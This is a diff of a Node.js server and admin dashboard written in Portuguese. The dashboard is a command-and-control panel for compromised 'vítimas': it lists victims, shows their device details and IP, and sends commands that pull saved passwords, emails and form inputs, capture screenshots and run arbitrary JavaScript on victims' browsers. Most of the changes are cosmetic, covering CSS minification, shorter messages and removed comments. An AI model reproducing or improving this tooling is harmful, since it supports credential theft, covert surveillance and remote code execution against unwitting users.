@@ -13,67 +13,66 @@ const imageChunks = {};
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="pt-br">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Æ Painel de Controle</title>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Æ Painel</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body { background:#0b0d1a; color:#e0e5ff; font-family:'Segoe UI', system-ui, sans-serif; display:flex; height:100vh; overflow:hidden; }
-.sidebar { width:260px; background:#13162b; border-right:1px solid #2a2f55; display:flex; flex-direction:column; padding:16px; flex-shrink:0; overflow-y:auto; }
-.sidebar h1 { font-size:20px; font-weight:700; background:linear-gradient(135deg,#00f0ff,#7b2ffc); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:8px; }
-.sidebar .status { font-size:12px; color:#7b8ab8; margin-bottom:16px; display:flex; align-items:center; gap:8px; }
-.sidebar .status .dot { width:8px; height:8px; background:#00ff88; border-radius:50%; animation:pulse 1.5s infinite; }
-@keyframes pulse { 0%{opacity:1} 50%{opacity:0.3} }
-.sidebar .counter { background:#1c2142; padding:10px 14px; border-radius:10px; margin-bottom:14px; border-left:3px solid #00f0ff; }
-.sidebar .counter span { font-size:24px; font-weight:700; color:#fff; }
-.sidebar .counter small { color:#8892c0; font-size:12px; display:block; }
-#victim-list { flex:1; overflow-y:auto; list-style:none; margin-top:4px; }
-#victim-list li { padding:8px 12px; margin-bottom:4px; background:#181d3a; border-radius:8px; cursor:pointer; transition:0.2s; border-left:2px solid transparent; font-size:12px; display:flex; justify-content:space-between; align-items:center; }
-#victim-list li:hover { background:#222a52; }
-#victim-list li.active { border-left-color:#00f0ff; background:#1f264a; }
-#victim-list li .badge { background:#2a3366; padding:2px 8px; border-radius:20px; font-size:10px; color:#aab4e0; }
-.main { flex:1; display:flex; flex-direction:column; padding:16px 20px; background:#0b0d1a; overflow:hidden; }
-.main-header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom:10px; }
-.main-header h2 { font-weight:400; font-size:16px; color:#bcc6f0; }
-.main-header h2 strong { color:#fff; font-weight:600; }
-.main-header .actions { display:flex; gap:6px; align-items:center; flex-wrap:wrap; }
-.main-header .actions button { background:#1a1f3d; border:none; color:#aab4e0; padding:5px 12px; border-radius:20px; font-size:11px; cursor:pointer; transition:0.2s; font-weight:500; }
-.main-header .actions button:hover { background:#2a2f55; color:#fff; }
-.main-header .actions .cmd-btn { background:#1a2a4a; color:#6dd5ed; border:1px solid #2a4a6a; }
-.main-header .actions .cmd-btn:hover { background:#2a4a6a; }
-.main-header .actions .danger-btn { background:#3d1a2a; color:#ff7b9c; }
-.main-header .actions .danger-btn:hover { background:#5a1f3a; }
-.main-header .actions .cmd-input { background:#0e1124; border:1px solid #1e2346; color:#d0d9ff; padding:4px 10px; border-radius:16px; font-size:11px; width:180px; font-family:monospace; }
-.main-header .actions .cmd-input:focus { outline:none; border-color:#00f0ff; }
-.device-info { background:#0e1124; border-radius:10px; padding:8px 14px; margin-bottom:10px; border:1px solid #1e2346; font-size:11px; color:#8892c0; display:flex; flex-wrap:wrap; gap:6px 16px; max-height:80px; overflow-y:auto; }
-.device-info .item { display:flex; gap:4px; white-space:nowrap; }
-.device-info .item .label { color:#4a5580; }
-.device-info .item .value { color:#d0d9ff; font-weight:500; }
-.tabs { display:flex; gap:4px; margin-bottom:8px; border-bottom:1px solid #1e2346; padding-bottom:6px; }
-.tabs button { background:transparent; border:none; color:#4a5580; padding:4px 14px; border-radius:12px; font-size:11px; cursor:pointer; transition:0.2s; }
-.tabs button:hover { color:#aab4e0; background:#1a1f3d; }
-.tabs button.active { color:#fff; background:#1a1f3d; }
-#log-container { flex:1; background:#0e1124; border-radius:12px; border:1px solid #1e2346; padding:10px 14px; overflow-y:auto; font-family:'JetBrains Mono', monospace; font-size:11px; line-height:1.4; }
-.log-entry { padding:2px 0; border-bottom:1px solid #171d38; display:flex; gap:8px; animation:fadeIn 0.15s ease; align-items:flex-start; }
-@keyframes fadeIn { from{opacity:0;transform:translateY(-2px)} to{opacity:1} }
-.log-entry .time { color:#4a5580; white-space:nowrap; min-width:50px; font-size:10px; }
-.log-entry .type-tag { background:#2a2f55; padding:0 8px; border-radius:10px; font-size:8px; text-transform:uppercase; color:#aab4e0; letter-spacing:0.3px; white-space:nowrap; }
-.log-entry .content { color:#d0d9ff; word-break:break-all; flex:1; font-size:11px; }
-.log-entry .content img.screenshot-thumb { max-width:180px; max-height:120px; border-radius:4px; border:1px solid #2a2f55; cursor:pointer; margin-top:2px; transition:0.2s; }
-.log-entry .content img.screenshot-thumb:hover { transform:scale(1.02); border-color:#00f0ff; }
-.log-entry .content .json-block { background:#0b0d1a; padding:3px 6px; border-radius:4px; font-size:10px; white-space:pre-wrap; word-break:break-all; max-height:80px; overflow-y:auto; border:1px solid #1e2346; font-family:monospace; }
-.highlight-input { color:#ffd966; }
-.highlight-click { color:#ff7b9c; }
-.highlight-key { color:#6dd5ed; }
-.highlight-clip { color:#b38bff; }
-.highlight-handshake { color:#8be07a; }
-.highlight-cmd { color:#ffaa44; }
-::-webkit-scrollbar { width:4px; }
-::-webkit-scrollbar-track { background:#0b0d1a; }
-::-webkit-scrollbar-thumb { background:#2a2f55; border-radius:10px; }
-.empty-state { color:#3d4670; text-align:center; padding:30px 0; font-size:13px; }
-.lightbox { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); justify-content:center; align-items:center; z-index:9999; }
-.lightbox.active { display:flex; }
-.lightbox img { max-width:90%; max-height:90%; border-radius:10px; border:2px solid #2a2f55; }
-.lightbox .close-lb { position:absolute; top:16px; right:24px; font-size:32px; color:#fff; cursor:pointer; }
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0b0d1a;color:#e0e5ff;font-family:'Segoe UI',sans-serif;display:flex;height:100vh;overflow:hidden}
+.sidebar{width:260px;background:#13162b;border-right:1px solid #2a2f55;display:flex;flex-direction:column;padding:16px;overflow-y:auto;flex-shrink:0}
+.sidebar h1{font-size:20px;font-weight:700;background:linear-gradient(135deg,#00f0ff,#7b2ffc);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
+.sidebar .status{font-size:12px;color:#7b8ab8;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.sidebar .status .dot{width:8px;height:8px;background:#00ff88;border-radius:50%;animation:pulse 1.5s infinite}
+@keyframes pulse{0%{opacity:1}50%{opacity:0.3}}
+.sidebar .counter{background:#1c2142;padding:10px 14px;border-radius:10px;margin-bottom:14px;border-left:3px solid #00f0ff}
+.sidebar .counter span{font-size:24px;font-weight:700;color:#fff}
+.sidebar .counter small{color:#8892c0;font-size:12px;display:block}
+#victim-list{flex:1;overflow-y:auto;list-style:none;margin-top:4px}
+#victim-list li{padding:8px 12px;margin-bottom:4px;background:#181d3a;border-radius:8px;cursor:pointer;transition:.2s;border-left:2px solid transparent;font-size:12px;display:flex;justify-content:space-between;align-items:center}
+#victim-list li:hover{background:#222a52}
+#victim-list li.active{border-left-color:#00f0ff;background:#1f264a}
+#victim-list li .badge{background:#2a3366;padding:2px 8px;border-radius:20px;font-size:10px;color:#aab4e0}
+.main{flex:1;display:flex;flex-direction:column;padding:16px 20px;background:#0b0d1a;overflow:hidden}
+.main-header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:10px}
+.main-header h2{font-weight:400;font-size:16px;color:#bcc6f0}
+.main-header h2 strong{color:#fff;font-weight:600}
+.main-header .actions{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.main-header .actions button{background:#1a1f3d;border:none;color:#aab4e0;padding:5px 12px;border-radius:20px;font-size:11px;cursor:pointer;transition:.2s;font-weight:500}
+.main-header .actions button:hover{background:#2a2f55;color:#fff}
+.main-header .actions .cmd-btn{background:#1a2a4a;color:#6dd5ed;border:1px solid #2a4a6a}
+.main-header .actions .cmd-btn:hover{background:#2a4a6a}
+.main-header .actions .danger-btn{background:#3d1a2a;color:#ff7b9c}
+.main-header .actions .danger-btn:hover{background:#5a1f3a}
+.main-header .actions .cmd-input{background:#0e1124;border:1px solid #1e2346;color:#d0d9ff;padding:4px 10px;border-radius:16px;font-size:11px;width:180px;font-family:monospace}
+.main-header .actions .cmd-input:focus{outline:none;border-color:#00f0ff}
+.device-info{background:#0e1124;border-radius:10px;padding:8px 14px;margin-bottom:10px;border:1px solid #1e2346;font-size:11px;color:#8892c0;display:flex;flex-wrap:wrap;gap:6px 16px;max-height:80px;overflow-y:auto}
+.device-info .item{display:flex;gap:4px;white-space:nowrap}
+.device-info .item .label{color:#4a5580}
+.device-info .item .value{color:#d0d9ff;font-weight:500}
+.tabs{display:flex;gap:4px;margin-bottom:8px;border-bottom:1px solid #1e2346;padding-bottom:6px}
+.tabs button{background:transparent;border:none;color:#4a5580;padding:4px 14px;border-radius:12px;font-size:11px;cursor:pointer;transition:.2s}
+.tabs button:hover{color:#aab4e0;background:#1a1f3d}
+.tabs button.active{color:#fff;background:#1a1f3d}
+#log-container{flex:1;background:#0e1124;border-radius:12px;border:1px solid #1e2346;padding:10px 14px;overflow-y:auto;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.4}
+.log-entry{padding:2px 0;border-bottom:1px solid #171d38;display:flex;gap:8px;animation:fadeIn .15s ease;align-items:flex-start}
+@keyframes fadeIn{from{opacity:0;transform:translateY(-2px)}to{opacity:1}}
+.log-entry .time{color:#4a5580;white-space:nowrap;min-width:50px;font-size:10px}
+.log-entry .type-tag{background:#2a2f55;padding:0 8px;border-radius:10px;font-size:8px;text-transform:uppercase;color:#aab4e0;letter-spacing:.3px;white-space:nowrap}
+.log-entry .content{color:#d0d9ff;word-break:break-all;flex:1;font-size:11px}
+.log-entry .content img.screenshot-thumb{max-width:180px;max-height:120px;border-radius:4px;border:1px solid #2a2f55;cursor:pointer;margin-top:2px;transition:.2s}
+.log-entry .content img.screenshot-thumb:hover{transform:scale(1.02);border-color:#00f0ff}
+.highlight-input{color:#ffd966}
+.highlight-click{color:#ff7b9c}
+.highlight-key{color:#6dd5ed}
+.highlight-clip{color:#b38bff}
+.highlight-handshake{color:#8be07a}
+.highlight-cmd{color:#ffaa44}
+::-webkit-scrollbar{width:4px}
+::-webkit-scrollbar-track{background:#0b0d1a}
+::-webkit-scrollbar-thumb{background:#2a2f55;border-radius:10px}
+.empty-state{color:#3d4670;text-align:center;padding:30px 0;font-size:13px}
+.lightbox{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);justify-content:center;align-items:center;z-index:9999}
+.lightbox.active{display:flex}
+.lightbox img{max-width:90%;max-height:90%;border-radius:10px;border:2px solid #2a2f55}
+.lightbox .close-lb{position:absolute;top:16px;right:24px;font-size:32px;color:#fff;cursor:pointer}
 </style></head>
 <body>
 <div class="lightbox" id="lightbox" onclick="this.classList.remove('active')"><span class="close-lb">&times;</span><img id="lb-img" src=""></div>
@@ -113,12 +112,13 @@ function connect() {
   if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
   ws = new WebSocket(WS_URL);
   ws.onopen = () => {
-    console.log('[+] Conectado ao servidor');
+    console.log('[+] Conectado');
     ws.send(JSON.stringify({type:'admin'}));
   };
   ws.onmessage = (e) => {
     try {
       const msg = JSON.parse(e.data);
+      console.log('[Mensagem recebida]', msg);
       if (msg.type === 'update') {
         if (!allData[msg.sess]) allData[msg.sess] = [];
         allData[msg.sess].push(msg);
@@ -130,10 +130,10 @@ function connect() {
         const keys = Object.keys(allData);
         if (keys.length) selectVictim(keys[0]);
       }
-    } catch(err) { console.error('Erro ao processar mensagem:', err); }
+    } catch(err) { console.error('Erro:', err); }
   };
   ws.onclose = () => {
-    console.log('[-] Desconectado, reconectando em 3s...');
+    console.log('[-] Desconectado, reconectando...');
     if (reconnectTimer) clearTimeout(reconnectTimer);
     reconnectTimer = setTimeout(connect, 3000);
   };
@@ -141,12 +141,8 @@ function connect() {
 }
 
 function sendCommand(cmd, extra) {
-  if (!selectedId) { alert('Selecione uma vítima primeiro!'); return; }
-  if (!ws || ws.readyState !== WebSocket.OPEN) {
-    alert('WebSocket desconectado. Reconectando...');
-    connect();
-    return;
-  }
+  if (!selectedId) { alert('Selecione uma vítima'); return; }
+  if (!ws || ws.readyState !== WebSocket.OPEN) { alert('WebSocket desconectado'); connect(); return; }
   const payload = { type: 'command', cmd, target: selectedId };
   if (extra) Object.assign(payload, extra);
   ws.send(JSON.stringify(payload));
@@ -161,7 +157,7 @@ document.getElementById('cmd-emails').addEventListener('click', () => sendComman
 document.getElementById('cmd-allinputs').addEventListener('click', () => sendCommand('get_all_inputs'));
 document.getElementById('cmd-execute').addEventListener('click', () => {
   const code = document.getElementById('cmd-js-input').value.trim();
-  if (!code) { alert('Digite um código JS'); return; }
+  if (!code) return alert('Digite um código JS');
   sendCommand('execute_js', { code });
   document.getElementById('cmd-js-input').value = '';
 });
@@ -198,8 +194,6 @@ function renderDeviceInfo(id) {
   if (h && h.device) {
     const d = h.device;
     const accessTime = h._t ? new Date(h._t).toLocaleString('pt-BR') : 'desconhecido';
-    const ip = h.ip || 'desconhecido';
-    const geo = h.geo || 'Desconhecido';
     div.style.display = 'flex';
     div.innerHTML = \`
       <span class="item"><span class="label">Marca/Modelo:</span> <span class="value">\${d.brand || '?'} \${d.deviceModel || '?'}</span></span>
@@ -207,8 +201,7 @@ function renderDeviceInfo(id) {
       <span class="item"><span class="label">Tela:</span> <span class="value">\${d.screen?.w || '?'}x\${d.screen?.h || '?'}</span></span>
       <span class="item"><span class="label">RAM:</span> <span class="value">\${d.hardware?.memory || '?'} GB</span></span>
       <span class="item"><span class="label">Rede:</span> <span class="value">\${d.network?.type || '?'}</span></span>
-      <span class="item"><span class="label">IP:</span> <span class="value">\${ip}</span></span>
-      <span class="item"><span class="label">Localização:</span> <span class="value">\${geo}</span></span>
+      <span class="item"><span class="label">IP:</span> <span class="value">\${h.ip || 'desconhecido'}</span></span>
       <span class="item"><span class="label">Acesso:</span> <span class="value">\${accessTime}</span></span>
     \`;
   } else { div.style.display = 'none'; }
@@ -256,21 +249,26 @@ function renderLogs(id) {
             content = \`📸 Print sob demanda <img src="\${log.image}" class="screenshot-thumb" onclick="event.stopPropagation(); document.getElementById('lb-img').src=this.src; document.getElementById('lightbox').classList.add('active');" />\`;
           } else { content = '📸 Print falhou'; }
         } else if (log.cmd === 'passwords') {
-          content = \`🔑 \${log.count || 0} senha(s) encontradas:\n\` + JSON.stringify(log.data || [], null, 2);
+          content = \`🔑 \${log.count || 0} senha(s):\n\` + JSON.stringify(log.data || [], null, 2);
           cls = 'highlight-clip';
         } else if (log.cmd === 'emails') {
-          content = \`📧 \${log.count || 0} email(s) encontrados:\n\` + JSON.stringify(log.data || [], null, 2);
+          content = \`📧 \${log.count || 0} email(s):\n\` + JSON.stringify(log.data || [], null, 2);
           cls = 'highlight-clip';
         } else if (log.cmd === 'get_all_inputs') {
-          content = \`📋 \${log.count || 0} campo(s) encontrados:\n\` + JSON.stringify(log.data || [], null, 2);
+          content = \`📋 \${log.count || 0} campo(s):\n\` + JSON.stringify(log.data || [], null, 2);
         } else if (log.cmd === 'execute_js') {
-          content = log.success ? \`✅ JS executado: \${log.result || 'sem retorno'}\` : \`❌ Erro: \${log.error || 'desconhecido'}\`;
-          cls = log.success ? 'highlight-handshake' : 'highlight-click';
+          if (log.success) {
+            content = \`✅ Resultado: \${log.result || 'sem retorno'}\`;
+            cls = 'highlight-handshake';
+          } else {
+            content = \`❌ Erro: \${log.error || 'desconhecido'}\`;
+            cls = 'highlight-click';
+          }
         } else if (log.cmd === 'ack') {
-          content = \`✅ Comando "\${log.command}" recebido pela vítima\`;
+          content = \`✅ Comando "\${log.command}" recebido\`;
           cls = 'highlight-handshake';
         } else if (log.cmd === 'message_received') {
-          content = \`📨 Mensagem "\${log.original}" recebida pela vítima\`;
+          content = \`📨 Mensagem "\${log.original}" recebida\`;
           cls = 'highlight-cmd';
         } else {
           content = JSON.stringify(log, null, 2);
@@ -358,7 +356,6 @@ wss.on('connection', async (ws) => {
         }
         return;
       }
-      // Trata chunks de imagem
       if (data.type === 'image_chunk' && data.sess) {
         const key = data.cmd;
         if (!imageChunks[data.sess]) imageChunks[data.sess] = {};
@@ -391,7 +388,6 @@ wss.on('connection', async (ws) => {
         }
         return;
       }
-      // Dados normais da vítima
       if (data.sess) {
         if (!victimConnections[data.sess] || victimConnections[data.sess].readyState !== WebSocket.OPEN) {
           victimConnections[data.sess] = ws;
@@ -408,7 +404,7 @@ wss.on('connection', async (ws) => {
           }
         });
       }
-    } catch(e) { console.error('[Servidor] Erro ao processar mensagem:', e); }
+    } catch(e) { console.error('[Servidor] Erro:', e); }
   });
 
   ws.on('close', () => {
